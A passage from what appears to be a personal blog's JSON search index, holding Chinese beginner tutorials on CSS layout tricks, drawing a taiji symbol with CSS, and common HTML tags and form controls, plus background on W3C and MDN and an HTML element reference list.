使用同样的思路，也可以做出水平居中的效果。\n关于CSS布局的小技巧 图片宽度的自适应\n如何使得较大的图片，能够自动适应小容器的宽度？CSS可以这样写：\n img {max-width: 100%} CSS的优先性\n如果同一个容器被多条CSS语句定义，那么哪一个定义优先呢？\n基本规则是：\n行内样式 \u0026gt; id样式 \u0026gt; class样式 \u0026gt; 标签名样式\n比如，有一个元素：\n \u0026lt;div id=\u0026quot;ID\u0026quot; class=\u0026quot;CLASS\u0026quot; style=\u0026quot;color:black;\u0026quot;\u0026gt; \u0026lt;/div\u0026gt; 行内样式是最优先的，然后其他设置的优先性，从低到高依次为：\n div \u0026lt; .class \u0026lt; div.class \u0026lt; #id \u0026lt; div#id \u0026lt; #id.class \u0026lt; div#id.class 用图片充当列表标志\n默认情况下，浏览器使用一个黑圆圈作为列表标志，可以用图片取代它：\n　ul {list-style: none} ul li { background-image: url(\u0026quot;path-to-your-image\u0026quot;); background-repeat: none; background-position: 0 0.5em; } 透明\n将一个容器设为透明，可以使用下面的代码：\n　.element { filter:alpha(opacity=50); -moz-opacity:0.5; -khtml-opacity: 0.5; opacity: 0.5; } CSS三角形\n如何使用CSS生成一个三角形？\n先编写一个空元素\n\u0026lt;div class=\u0026quot;triangle\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; 然后，将它四个边框中的三个边框设为透明，剩下一个设为可见，就可以生成三角形效果：\n　.triangle { border-color: transparent transparent green transparent; border-style: solid; border-width: 0px 300px 300px 300px; height: 0px; width: 0px; } 其他图形可以用同样的道理画出。\nCSS提示框 当鼠标移动到链接上方，会自动出现一个提示框。\n\u0026lt;a class=\u0026quot;tooltip\u0026quot; href=\u0026quot;#\u0026quot;\u0026gt;链接文字 \u0026lt;span\u0026gt;提示文字\u0026lt;/span\u0026gt; \u0026lt;/a\u0026gt; CSS这样写：\n　a.tooltip {position: relative} a.tooltip span {display:none; padding:5px; width:200px;} a:hover {background:#fff;} /*background-color is a must for IE6*/ a.tooltip:hover span{display:inline; position:absolute;} 固定位置的页首\n当页面滚动时，有时需要页首在位置固定不变，CSS语句可以这样写，效果参见http://limpid.nl/lab/css/fixed/header：\n　body{ margin:0;padding:100px 0 0 0;} div#header{ position:absolute; top:0; left:0; width:100%; height:\u0026lt;length\u0026gt;; } @media screen{ body\u0026gt;div#header{position: fixed;} } * html body{overflow:hidden;} * html div#content{height:100%;overflow:auto;} 容器的水平和垂直居中\nHTML代码如下\n\u0026lt;figure class='logo'\u0026gt; \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;img class='photo'/\u0026gt; \u0026lt;/figure\u0026gt; CSS代码如下：\n.logo { display: block; text-align: center; display: block; text-align: center; vertical-align: middle; border: 4px solid #dddddd; padding: 4px; height: 74px; width: 74px; } .logo * { display: inline-block; height: 100%; vertical-align: middle; } .logo .photo { height: auto; width: auto; max-width: 100%; max-height: 100%; }  本博客相关内容出处来自阮一峰的博客\n","date":"2019-03-20T20:53:01+08:00","permalink":"http://808Mak1r.github.io/p/css%E5%B8%83%E5%B1%80/","title":"CSS布局"},{"content":"本文将介绍如何用CSS画一个太极图\n首先 画一个方块黑白各一半\nbody { background-color: lightslategray; } .yy { width: 0px; height: 600px; border-left: 300px solid black; border-right: 300px solid white; } 如图 再画白色部分的园（先画方块）\n.yy::before { content: ''; display: block; width: 100px; height: 100px; border: 100px solid black ; border-image-repeat: } 如图 再设置它的半径为100%\n border-image-repeat: 图3 再让圆居中对齐\n background-color: white; margin-left: -150px; 图4\n接下来在白色下面画一个宽高100px的方块，在上面加一个100px白色的外框，和上面一样让它的半径100%再加上黑色的背景色，一个小黑球就完成了\n.yy::after { content: ''; display: block; width: 100px; height: 100px; border: 100px solid white; border-radius: 100%; background-color: black; } 图5\n然后同理让整个图的半径100%就变成圆了\nbody { background-color: lightslategray; } .yy { width: 0px; height: 600px; border-left: 300px solid black; border-right: 300px solid white; border-radius: 100%; margin-top: 60px; margin-left: auto; margin-right: auto; margin-bottom: auto; } .yy::before { content: ''; display: block; width: 100px; height: 100px; border: 100px solid black ; border-radius: 100%; background-color: white; margin-left: -150px; } .yy::after { content: ''; display: block; width: 100px; height: 100px; border: 100px solid white; border-radius: 100%; background-color: black; margin-left: -150px; } ","date":"2019-03-19T20:58:12+08:00","permalink":"http://808Mak1r.github.io/p/%E5%A6%82%E4%BD%95%E7%94%A8css%E7%94%BB%E4%B8%80%E4%B8%AA%E5%A4%AA%E6%9E%81/","title":"如何用CSS画一个太极"},{"content":"1.HTML5头部结构 【DOCTYPE html】 声明文档类型为HTML5文件。 文档声明在HTML5文档必不可少，且必须放在文档的第一行。\n【meta标签】 1-charset属性：单独使用，设置文档字符及编码格式。 写法：\n\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 常见的中文编码格式： B-2312:国标码，简体中文 GBK：扩展的国标编码，简体中文 UTF-8:万国码 Unicode码，基本兼容各国语言 2-http-equiv属性：需配合content属性使用。主要声明浏览器如何解释编译文件。 写法：```html\n【link标签】 1-作用：用于为网页链接各种文件。 2-常用属性： rel：用于表明被链接文件与当前文件关系。icon表明被链接图片是当前网页的icon图标。 type：表明被链接文件是什么类型，可省略。 href：表明链接文件的地址。\n\u0026lt;link rel=\u0026#34;icon\u0026#34; href=\u0026#34;img/icon.png\u0026#34; /\u0026gt; 【title标签】 网页的标题，即网页选项卡上的文字。\n\u0026lt;title\u0026gt;111\u0026lt;/title\u0026gt; 2.常见的块级标签\n【常见的块级标签】\n标题标签\u0026lt;h1\u0026gt;\u0026lt;/h1\u0026gt;...\u0026lt;h6\u0026gt;\u0026lt;/h6\u0026gt; 水平线\u0026lt;hr/\u0026gt; 段落\u0026lt;p\u0026gt;\u0026lt;/p\u0026gt; 换行\u0026lt;br/\u0026gt; 引用\u0026lt;blockquote\u0026lt;/blockquote\u0026gt; 预格式\u0026lt;pre\u0026gt;\u0026lt;/pre\u0026gt; 引用标签```\u0026lt;blockquote\u0026gt;\u0026lt;/blockquote\u0026gt; 表明标签中的文字，为引用的内容，浏览器显示为等宽字体，并缩进。 cite属性，表明引用的来源，一般为引用的网址URL \u0026lt;blockquote cite=\u0026#34;http：//www.yt4561761.com\u0026#34;\u0026gt;dfdsfsdfd\u0026lt;/blockquote\u0026gt; 预格式标签\u0026lt;pre\u0026gt;\u0026lt;/pre\u0026gt; 浏览器解析时，会按照等宽字体显示，并保留标签内的空格和回车。 常用于保留代码格式。 \u0026lt;pre\u0026gt;yt4561761yt4561761yt4561761\u0026lt;/pre\u0026gt; 【有序列表ol order list】\n\u0026lt;ol\u0026gt; \u0026lt;li\u0026gt;一\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;二\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;三\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;四\u0026lt;/li\u0026gt; \u0026lt;/ol\u0026gt; 【无序列表ul unorder list】\n\u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;1\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;2\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;3\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;4\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; 【定义描述列表】\n\u0026lt;dl\u0026gt; \u0026lt;dt\u0026gt;标题\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt;描述项\u0026lt;/dd\u0026gt; \u0026lt;/dl\u0026gt; 一般情况下，标题dt只有一项。描述项dd可以有多项。 浏览器显示时，标题顶格显示，dd缩进显示。\n\u0026lt;dl\u0026gt; \u0026lt;dt\u0026gt;这是dl列表的标题\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt;描述项1\u0026lt;/dd\u0026gt; \u0026lt;dd\u0026gt;描述项2\u0026lt;/dd\u0026gt; \u0026lt;dd\u0026gt;描述项3\u0026lt;/dd\u0026gt; \u0026lt;/dl\u0026gt; 【图片组合标签figure】\n1-\u0026lt;figure\u0026gt;\u0026lt;/figure\u0026gt;标签有两个子标签： \u0026lt;img src=\u0026#34;\u0026#34;\u0026gt;:一幅图片，src表示图片的路径。 \u0026lt;figcaption\u0026gt;\u0026lt;/figcaption\u0026gt;：图片的标题 2-浏览器显示为：图片与标题上下排列，且整体向后缩进一个单位。 \u0026lt;figure\u0026gt; \u0026lt;img src=\u0026#34;img/icon.png\u0026#34; /\u0026gt; \u0026lt;figcaption\u0026gt;asd \u0026lt;/figcaption\u0026gt; \u0026lt;/figure\u0026gt; 【分区标签div】 常配合CSS使用，为网页中最常用的分区标签，常用于网页布局使用\n\u0026lt;div style=\u0026#34;width：100%; height：100px; \u0026#34;\u0026gt; 这是div里面的文字 \u0026lt;h1\u0026gt;div里面的标题\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; 3.常见的行级标签\n【常见的行级标签】 span 文本 img 图片 em 强调 strong 强调 q 短引用 a 超链接 i 倾斜 b 加粗 small 缩小字体 u 下划线\nspan（文本）：用于包裹一部分文字，进行特定样式的修改。\n\u0026lt;span style=\u0026#34;color:red; font-size:36px;\u0026#34;\u0026gt;酷\u0026lt;/span\u0026gt; em（强调）：浏览器显示为倾斜。 strong（强调）：浏览器显示为加粗。\n【strong/em/i/b 标签的区别】 1-em和strong都表示强调，strong\u0026gt;em,strong和em标签均可多层嵌套，表示强调程度的递增。 2-em和i都能倾斜，Strong和b都能加粗。但是Strong和em多了一层强调的语义。可以帮助搜索 引擎快速抓取网站重点。且html5要求开发者尽可能实现代码的语义化。\n\u0026lt;em\u0026gt;我真踏马帅！！\u0026lt;/em\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;strong\u0026gt;我真籍八帅！！\u0026lt;/strong\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;i\u0026gt;我被i标签弄斜了\u0026lt;/i\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;我被b标签弄粗了\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt; 【q(短引用)】常用于一句话的引用，cite属性表示引用来源，浏览器解析时，会在内容的前后插入双引号。\n\u0026lt;q cite=\u0026#34;www.yt4561761.com\u0026#34;\u0026gt;那你很棒哦\u0026lt;/q\u0026gt; small（缩小字体）：small标签可多层嵌套，表示比默认字体小一号，直到小到最小号为止。\nbig（放大字体）：亦可多层嵌套，直到最大。 但在最新规范中，small和big标签不提倡使用。提倡使用style=\u0026ldquo;font-size:11px;\u0026ldquo;CSS样式替代。\n\u0026lt;p\u0026gt;那你很\u0026lt;big\u0026gt;\u0026lt;big\u0026gt;\u0026lt;big\u0026gt;\u0026lt;big\u0026gt;\u0026lt;big\u0026gt;棒\u0026lt;/big\u0026gt;\u0026lt;/big\u0026gt;\u0026lt;/big\u0026gt;\u0026lt;/big\u0026gt;\u0026lt;/big\u0026gt;哦！\u0026lt;/p\u0026gt; 【img 图片标签】 1-src属性：表示图片引用路径。 常见路径的写法： ①相对路径： Ⅰ -当图片在当前文件下一层时：文件夹名/图片名 例如：img/abc.jpg Ⅱ-当图片与当前文件在同一层时：图片名 例如：src=\u0026ldquo;abc.jpg\u0026rdquo; Ⅲ-当图片在当前文件上一层时：../图片名 例如：src=\u0026rdquo;../abc.jpg\u0026rdquo; 使用相对路径时，图片最外层只能放到网站根目录（图片必须要在项目文件夹中） ②绝对路径：写法file：///E:/aaa.png 但是，严禁使用 ③网络连接：直接使用图片的网络地址，但由于图片在别的服务器，不可控，故不建议使用 2-title:图片的标题。当鼠标指上时，显示的提示文字。 3-alt：当图片无法加载时显示的文字。 4-width/height:图片的尺寸，相当于CSS中的style=\u0026ldquo;width:\u0026rdquo; 5-align:图片周围的文字，相对于图片的排列方式。可选值：top/center/bottm\n4.表格标签\n【table】\n\u0026lt;table\u0026gt;\u0026lt;/table\u0026gt;表格框 \u0026lt;tr\u0026gt;\u0026lt;/tr\u0026gt;表格行 \u0026lt;td\u0026gt;\u0026lt;/td\u0026gt;表格列 \u0026lt;th\u0026gt;\u0026lt;/th\u0026gt;表格标题列（将tr中的td替换为th)，th默认加粗且在单元格居中显示。 【table的常用属性】 1-border：表格边框属性；当使用border=\u0026ldquo;1\u0026quot;设置边框时，会在所有td以及table上嵌套边框，当border加大时，只有table框会加粗。 2-cellspacing：单元格与单元格之间的间隙。当cellspacing=\u0026ldquo;0\u0026quot;时，单元格之间的间隙为0，但边框线并不会合并。 ☆☆合并边框的写法style=\u0026ldquo;border-collapse:collapse;\u0026rdquo; 使用边框合并时，无需设置cellspacing。 3-cellpadding:单元格内边距，单元格中文字与单元格边框之间的距离。 4-width/height:表格的宽高 5-align：设置表格在父容器中的对齐方式 ，left/居左 center/居中 right/居右 ☆☆当表格使用align属性时，相当于使表格浮动，可能会导致表格后面的元素受表格浮动影响，导致布局错乱。 6-bgcolor：背景色 7-background：背景图，后接相对路径。背景图和背景色同时生效时，图会覆盖背景色 8-bordercolor：设置边框颜色\n\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt; 标签的属性 当表格属性与行列属性冲突时，以行列属性为优先，属性设置优先级td\u0026gt;tr\u0026gt;table。 1-width,height:给单个的行列设置宽高 2-bgcolor:背景色 3-align：设置单元格中的文字，在单元格中的水平对齐方式 left/center/right 4-valign:设置单元格中文字在格中的垂直对齐方式 top/center/bottom 5-nowrap:nowrap=\u0026ldquo;nowrap\u0026quot;设置单元格文字行末不断行\n【表格的跨行与跨列】 1-跨列：colspan，某单元格跨N列，则该单元格右边的N-1个td就不需要了。 2-跨行：rowspan，某单元格跨N行，则该单元格下边的N-1个td就不需要了。\n5.表单标签 【form两个重要属性】 action：表单需要提交的服务器地址 method：表单提交数据使用的方法，get/post get和post的区别 ① get传参使用URL传递，所有参数在地址栏可见，不安全；get传参数据量有限。 ② post传参使用http请求传递，比较安全；post可以传递大量数据。 但是，get请求的传输速率比post快。\nURL传参的形式：链接URL地址?name1=value1\u0026amp;name2=value2\n【input的常用属性】 ① type：设置input的输入类型 ② name：给input输入框命名。一般情况下，name属性必不可少。因为，传递数据时，使用name=value（输入内容）的形式传递。 ③ value：input输入框的默认值 ④ placeholder：输入框的提示内容。当input有默认的value或输入值时，placeholder消失\n【input-type属性的常用属性值】 ① text：文本输入框 ② password：密码输入框，输入内容默认显示小黑点 ③ radio：单选框 checkbox：复选框 使用radio/checkbox时，value属性必填。提交时，提交的为value中的默认值； radio/checkbox凭借name属性，确定是否属于同一组，name相同为同组，只能选一个 使用checked=\u0026ldquo;checked\u0026quot;属性，设置默认选中项 ④ file：文件上传 使用accept=\u0026ldquo;类型\u0026rdquo;，设置只能上传的文件类型，如 accept=image/* 表示任意格式图片 ⑤ submit：提交按钮，将所有表单数据提交至后台服务器 ⑥ reset： 重置表单数据 ⑦ image：图形提交按钮，跟submit一样，具有表单提交功能 使用src属性确定图片路径 ⑧ button：普通按钮，没有屌用\n【属性名=属性值的情况】 ① checked=\u0026ldquo;checked\u0026rdquo; 设置radio ② multiple=\u0026ldquo;multiple\u0026rdquo; 设置select控件为多选，可在界面使用Ctrl+鼠标，进行多选。一般不用。 ③ selected=\u0026ldquo;selected\u0026rdquo; 设置select控件，默认选中的option选项 ④ readonly=\u0026ldquo;readonly\u0026rdquo; ⑤ disabled=\u0026ldquo;disabled\u0026rdquo; 当input被disabled时，该input的name和value数据将无法向后台传送 ⑥ hidden=\u0026ldquo;hidden\u0026rdquo; 隐藏控件。等效于\n\u0026lt;input type=\u0026#34;hiden\u0026#34; /\u0026gt; ⑦ nowrap=nowrap\n【下拉选择控件 select】 ① 写法：\u0026lt;select\u0026gt; \u0026lt;option\u0026gt;\u0026lt;/option\u0026gt;option可以有N多个 \u0026lt;/select\u0026gt; ② name属性，应该写在\u0026lt;select\u0026gt;上，所有选项只有一个name ③ multiple=\u0026#34;multiple\u0026#34; 设置select控件为多选，可在界面使用Ctrl+鼠标，进行多选。一般 不用。 ④ option常用属性： value=\u0026#34;\u0026#34;:当option没有value属性时，往后台传递的是\u0026lt;option\u0026gt;\u0026lt;/option\u0026gt;标签中的文字； 当option有value属性时，往后台传递的是value属性的值。 title=\u0026#34;\u0026#34;:鼠标指上后显示的文字。 selected=\u0026#34;selected\u0026#34;:默认选中。 ⑤ \u0026lt;optgroup label=\u0026#34;山东省\u0026#34;\u0026gt;\u0026lt;/optgroup\u0026gt; :用于将option标签进行分组，label属性表示分组名。 【文本域 textarea】 ① 写法：\u0026lt;textarea\u0026gt;\u0026lt;/textarea\u0026gt; ② 设置宽高style=\u0026#34;width: 200px; height: 150px;\u0026#34; 自身有cols=\u0026#34;\u0026#34; rows=\u0026#34;\u0026#34;两个属性，但不常用 ③ readonly=\u0026#34;readonly\u0026#34; 设置为只读模式，不允许编辑。 ④ style=\u0026#34;resize: none;\u0026#34; 设置为宽高不允许修改。 ⑤ style=\u0026#34;overflow: ;\u0026#34; 设置当文字超出区域时，如何处理。 也可以通过overflow-x/overflow-y分别设置水平垂直方向的显示方式。 常用属性值:hidden 超出区域的文字，隐藏无法显示 scroll 无论文字多少，均会显示滚动 auto 自动，根据文字多少自动决定是否显示滚动条（默认样式） 【表格的边框与标题】\n\u0026lt;fieldset\u0026gt; 表格的边框 \u0026lt;legend\u0026gt;边框标题\u0026lt;/legend\u0026gt; ...若干个表单元素 \u0026lt;/fieldset\u0026gt; ","date":"2019-03-17T15:59:25+08:00","permalink":"http://808Mak1r.github.io/p/html%E5%B8%B8%E7%94%A8%E6%A0%87%E7%AD%BE/","title":"HTML常用标签"},{"content":"什么是W3C 万维网联盟（World Wide Web Consortium，W3C），又称W3C理事会，是万维网的主要国际标准组织。为半自治非政府组织（quasi-autonomous non-governmental organisation）。\n历史 万维网联盟（W3C）由蒂姆·伯纳斯-李于1994年10月离开欧洲核子研究中心（CERN）后成立，在欧盟执委会和国防高等研究计划署（DARPA）的支持下成立于麻省理工学院MIT计算机科学与人工智能实验室（MIT／LCS），DARPA曾率先推出了互联网及其前身ARPANET。\n该组织试图透过W3C制定的新标准来促进业界成员间的兼容性和协议。不兼容的HTML版本由不同的供应商提供，导致网页显示方式不一致。联盟试图让所有的供应商实施一套由联盟选择的核心原则和组件。\nCERN最初打算做为W3C的欧洲分支机构，然而CERN希望把重点放在粒子物理而不是信息技术上。1995年4月，法国国家信息与自动化研究所（INRIA）成为W3C的欧洲机构。1996年9月，庆应义塾大学SFC研究所成为W3C亚洲机构。从1997年开始，W3C在世界各地创建了区域办事处。截至2009年9月，已有十八个区域办事处，涵盖澳大利亚、比荷卢联盟、巴西、中国、芬兰、德国、奥地利、希腊、香港、匈牙利、印度、以色列、意大利、韩国、摩洛哥、南非、西班牙、瑞典。2013年1月，北京航空航天大学成为W3C中国机构。2016年，W3C在英国和爱尔兰创建了区域办事处。\n标准 为解决网络应用中不同平台、技术和开发者带来的不兼容问题，保障网络信息的顺利和完整流通，万维网联盟制定了一系列标准并督促网络应用开发者和内容提供者遵循这些标准。标准的内容包括使用语言的规范，开发中使用的导则和解释引擎的行为等等。W3C也制定了包括XML和CSS等的众多影响深远的标准规范。\n但是，W3C制定的网络标准似乎并非强制，而只是推荐标准。因此部分网站仍然不能完全实现这些标准，特别是使用早期所见即所得网页编辑软件设计的网页往往会包含大量非标准代码。\n什么是MDN MDN Web Docs（旧称Mozilla Developer Network、Mozilla Developer Center，简称MDN）是一个汇集众多Mozilla基金会产品和网络技术开发文档的免费网站。\nMDN历史 该项目始于2005年，最初由Mozilla公司员工Deb Richardson领导。自2006年以来，文档工作由Eric Shepherd领导。\n网站最初的内容是由DevEdge提供，但在AOL收购Netscape后，DevEdge网站也宣布关闭。为此Mozilla基金会向AOL获取了DevEdge发布的内容，同时将DevEdge内容搬移到mozilla.org。\nMDN本身有一个论坛，并在Mozilla IRC网络上有一个IRC频道#mdn。MDN由Mozilla公司提供服务器和员工的资助。\n2016年10月3日发表的Brave网页浏览器将MDN作为其搜索引擎选项之一。\nHTML标签列表 根元素节 \u0026lt;html\u0026gt;\t代表 HTML 或 XHTML 文档的根。其他所有元素必须是这个元素的子节点。 文档元数据节 \u0026lt;head\u0026gt;\t代表关于文档元数据的一个集合，包括脚本或样式表的链接或内容。 \u0026lt;title\u0026gt;\t定义文档的标题，将显示在浏览器的标题栏或标签页上。该元素只能包含文本，包含的标签不会被解释。 \u0026lt;base\u0026gt;\t定义页面上相对 URL 的基准 URL。 \u0026lt;link\u0026gt;\t用于链接外部的 CSS 到该文档。 \u0026lt;meta\u0026gt;\t定义其他 HTML 元素无法描述的元数据。 \u0026lt;style\u0026gt;用于内联 CSS。 脚本节 \u0026lt;script\u0026gt;定义一个内联脚本或链接到外部脚本。脚本语言是 JavaScript。 \u0026lt;noscript\u0026gt; 定义当浏览器不支持脚本时显示的替代文字。 \u0026lt;template\u0026gt; 这个元素在 HTML5 中加入通过 JavaScript 在运行时实例化内容的容器。 章节节 \u0026lt;body\u0026gt;\t代表 HTML文档的内容。在文档中只能有一个 \u0026lt;body\u0026gt; 元素。 \u0026lt;section\u0026gt; 这个元素在 HTML5 中加入定义文档中的一个章节。 \u0026lt;nav\u0026gt; 这个元素在 HTML5 中加入定义只包含导航链接的章节。 \u0026lt;article\u0026gt; 这个元素在 HTML5 中加入定义可以独立于内容其余部分的完整独立内容块。 \u0026lt;aside\u0026gt; 这个元素在 HTML5 中加入\t定义和页面内容关联度较低的内容——如果被删除，剩下的内容仍然很合理。 \u0026lt;h1\u0026gt;,\u0026lt;h2\u0026gt;,\u0026lt;h3\u0026gt;,\u0026lt;h4\u0026gt;,\u0026lt;h5\u0026gt;,\u0026lt;h6\u0026gt;\t标题元素实现了六层文档标题，\u0026lt;h1\u0026gt; 是最大的标题，\u0026lt;h6\u0026gt; 是最小的标题。标题元素简要地描述章节的主题。 \u0026lt;header\u0026gt; 这个元素在 HTML5 中加入\t定义页面或章节的头部。它经常包含 logo、页面标题和导航性的目录。 \u0026lt;footer\u0026gt; 这个元素在 HTML5 中加入\t定义页面或章节的尾部。它经常包含版权信息、法律信息链接和反馈建议用的地址。 \u0026lt;address\u0026gt;\t定义包含联系信息的一个章节。 \u0026lt;main\u0026gt;这个元素在 HTML5 中加入\t定义文档中主要或重要的内容。 组织内容节 \u0026lt;p\u0026gt;\t定义一个段落。 \u0026lt;hr\u0026gt;\t代表章节、文章或其他长内容中段落之间的分隔符。 \u0026lt;pre\u0026gt;\t代表其内容已经预先排版过，格式应当保留 。 \u0026lt;blockquote\u0026gt;\t代表引用自其他来源的内容。 \u0026lt;ol\u0026gt;\t定义一个有序列表。 \u0026lt;ul\u0026gt;\t定义一个无序列表。 \u0026lt;li\u0026gt;\t定义列表中的一个列表项。 \u0026lt;dl\u0026gt;\t定义一个定义列表（一系列术语和其定义）。 \u0026lt;dt\u0026gt;\t代表一个由下一个 \u0026lt;dd\u0026gt; 定义的术语。 \u0026lt;dd\u0026gt;\t代表出现在它之前术语的定义。 \u0026lt;figure\u0026gt; 这个元素在 HTML5 中加入\t代表一个和文档有关的图例。 \u0026lt;figcaption\u0026gt; 这个元素在 HTML5 中加入\t代表一个图例的说明。 \u0026lt;div\u0026gt;\t代表一个通用的容器，没有特殊含义。 文字形式节 \u0026lt;a\u0026gt;\t代表一个链接到其他资源的超链接 。 \u0026lt;em\u0026gt;\t代表强调 文字。 \u0026lt;strong\u0026gt;\t代表特别重要 文字。 \u0026lt;small\u0026gt;\t代表注释 ，如免责声明、版权声明等，对理解文档不重要。 \u0026lt;s\u0026gt;\t代表不准确或不相关 的内容。 \u0026lt;cite\u0026gt;\t代表作品标题 。 \u0026lt;q\u0026gt;\t代表内联的引用 。 \u0026lt;dfn\u0026gt;\t代表一个术语包含在其最近祖先内容中的定义 。 \u0026lt;abbr\u0026gt;\t代表省略 或缩写 ，其完整内容在 title 属性中。 \u0026lt;data\u0026gt; 这个元素在 HTML5 中加入\t关联一个内容的机器可读的等价形式 （该元素只在 WHATWG 版本的 HTML 标准中，不在 W3C 版本的 HTML5 标准中）。 \u0026lt;time\u0026gt; 这个元素在 HTML5 中加入\t代表日期 和时间 值；机器可读的等价形式通过 datetime 属性指定。 \u0026lt;code\u0026gt;\t代表计算机代码 。 \u0026lt;var\u0026gt;\t代表代码中的变量 。 \u0026lt;samp\u0026gt;\t代表程序或电脑的输出 。 \u0026lt;kbd\u0026gt;\t代表用户输入 ，一般从键盘输出，但也可以代表其他输入，如语音输入。 \u0026lt;sub\u0026gt;,\u0026lt;sup\u0026gt;\t分别代表下标 和上标 。 \u0026lt;i\u0026gt;\t代表一段不同性质 的文字，如技术术语、外文短语等。 \u0026lt;b\u0026gt;\t代表一段需要被关注 的文字。 \u0026lt;u\u0026gt;\t代表一段需要下划线呈现的文本注释，如标记出拼写错误的文字等。 \u0026lt;mark\u0026gt; 这个元素在 HTML5 中加入\t代表一段需要被高亮的引用 文字。 \u0026lt;ruby\u0026gt; 这个元素在 HTML5 中加入\t代表被ruby 注释 标记的文本，如中文汉字和它的拼音。 \u0026lt;rt\u0026gt; 这个元素在 HTML5 中加入\t代表ruby 注释 ，如中文拼音。 \u0026lt;rp\u0026gt; 这个元素在 HTML5 中加入\t代表 ruby 注释两边的额外插入文本 ，用于在不支持 ruby 注释显示的浏览器中提供友好的注释显示。 \u0026lt;bdi\u0026gt; 这个元素在 HTML5 中加入\t代表需要脱离 父元素文本方向的一段文本。它允许嵌入一段不同或未知文本方向格式的文本。 \u0026lt;bdo\u0026gt;\t指定子元素的文本方向 ，显式地覆盖默认的文本方向。 \u0026lt;span\u0026gt;\t代表一段没有特殊含义的文本，当其他语义元素都不适合文本时候可以使用该元素。 \u0026lt;br\u0026gt;\t代表换行 。 \u0026lt;wbr\u0026gt; 这个元素在 HTML5 中加入\t代表建议换行 (Word Break Opportunity) ，当文本太长需要换行时将会在此处添加换行符。 编辑节 \u0026lt;ins\u0026gt;\t定义增加 到文档的内容。 \u0026lt;del\u0026gt;\t定义从文档移除 的内容。 嵌入内容节 \u0026lt;img\u0026gt;\t代表一张图片 。 \u0026lt;iframe\u0026gt;\t代表一个内联的框架 。 \u0026lt;embed\u0026gt; 这个元素在 HTML5 中加入\t代表一个嵌入 的外部资源，如应用程序或交互内容。 \u0026lt;object\u0026gt;\t代表一个外部资源 ，如图片、HTML 子文档、插件等。 \u0026lt;param\u0026gt;\t代表 \u0026lt;object\u0026gt; 元素所指定的插件的参数 。 \u0026lt;video\u0026gt; 这个元素在 HTML5 中加入\t代表一段视频 及其视频文件和字幕，并提供了播放视频的用户界面。 \u0026lt;audio\u0026gt; 这个元素在 HTML5 中加入\t代表一段声音 ，或音频流 。 \u0026lt;source\u0026gt; 这个元素在 HTML5 中加入\t为 \u0026lt;video\u0026gt; 或 \u0026lt;audio\u0026gt; 这类媒体元素指定媒体源 。 \u0026lt;track\u0026gt; 这个元素在 HTML5 中加入\t为 \u0026lt;video\u0026gt; 或 \u0026lt;audio\u0026gt; 这类媒体元素指定文本轨道（字幕） 。 \u0026lt;canvas\u0026gt; 这个元素在 HTML5 中加入\t代表位图区域 ，可以通过脚本在它上面实时呈现图形，如图表、游戏绘图等。 \u0026lt;map\u0026gt;\t与 \u0026lt;area\u0026gt; 元素共同定义图像映射 区域。 \u0026lt;area\u0026gt;\t与 \u0026lt;map\u0026gt; 元素共同定义图像映射 区域。 \u0026lt;svg\u0026gt; 这个元素在 HTML5 中加入\t定义一个嵌入式矢量图 。 \u0026lt;math\u0026gt; 这个元素在 HTML5 中加入\t定义一段数学公式 。 表格节 \u0026lt;table\u0026gt;\t定义多维数据 。 \u0026lt;caption\u0026gt;\t代表表格的标题 。 \u0026lt;colgroup\u0026gt;\t代表表格中一组单列或多列 。 \u0026lt;col\u0026gt;\t代表表格中的列 。 \u0026lt;tbody\u0026gt;\t代表表格中一块具体数据 （表格主体）。 \u0026lt;thead\u0026gt;\t代表表格中一块列标签 （表头）。 \u0026lt;tfoot\u0026gt;\t代表表格中一块列摘要 （表尾）。 \u0026lt;tr\u0026gt;\t代表表格中的行 。 \u0026lt;td\u0026gt;\t代表表格中的单元格 。 \u0026lt;th\u0026gt;\t代表表格中的头部单元格 。 表单节 \u0026lt;form\u0026gt;\t代表一个表单 ，由控件组成。 \u0026lt;fieldset\u0026gt;\t代表控件组 。 \u0026lt;legend\u0026gt;\t代表 \u0026lt;fieldset\u0026gt; 控件组的标题 。 \u0026lt;label\u0026gt;\t代表表单控件的标题 。 \u0026lt;input\u0026gt;\t代表允许用户编辑数据的数据区 （文本框、单选框、复选框等）。 \u0026lt;button\u0026gt;\t代表按钮 。 \u0026lt;select\u0026gt;\t代表下拉框 。 \u0026lt;datalist\u0026gt; 这个元素在 HTML5 中加入\t代表提供给其他控件的一组预定义选项 。 \u0026lt;optgroup\u0026gt;\t代表一个选项分组 。 \u0026lt;option\u0026gt;\t代表一个 \u0026lt;select\u0026gt; 元素或 \u0026lt;datalist\u0026gt; 元素中的一个选项 \u0026lt;textarea\u0026gt;\t代表多行文本框 。 \u0026lt;keygen\u0026gt; 这个元素在 HTML5 中加入\t代表一个密钥对生成器 控件。 \u0026lt;output\u0026gt; 这个元素在 HTML5 中加入\t代表计算值 。 \u0026lt;progress\u0026gt; 这个元素在 HTML5 中加入\t代表进度条 。 \u0026lt;meter\u0026gt; 这个元素在 HTML5 中加入\t代表滑动条 。 交互元素节 \u0026lt;details\u0026gt; 这个元素在 HTML5 中加入\t代表一个用户可以(点击)获取额外信息或控件的小部件 。 \u0026lt;summary\u0026gt; 这个元素在 HTML5 中加入\t代表 \u0026lt;details\u0026gt; 元素的综述 或标题 。 \u0026lt;menuitem\u0026gt; 这个元素在 HTML5 中加入\t代表一个用户可以点击的菜单项。 \u0026lt;menu\u0026gt; 这个元素在 HTML5 中加入\t代表菜单。 什么是空标签 没有闭合标签的标签被称作为空标签。 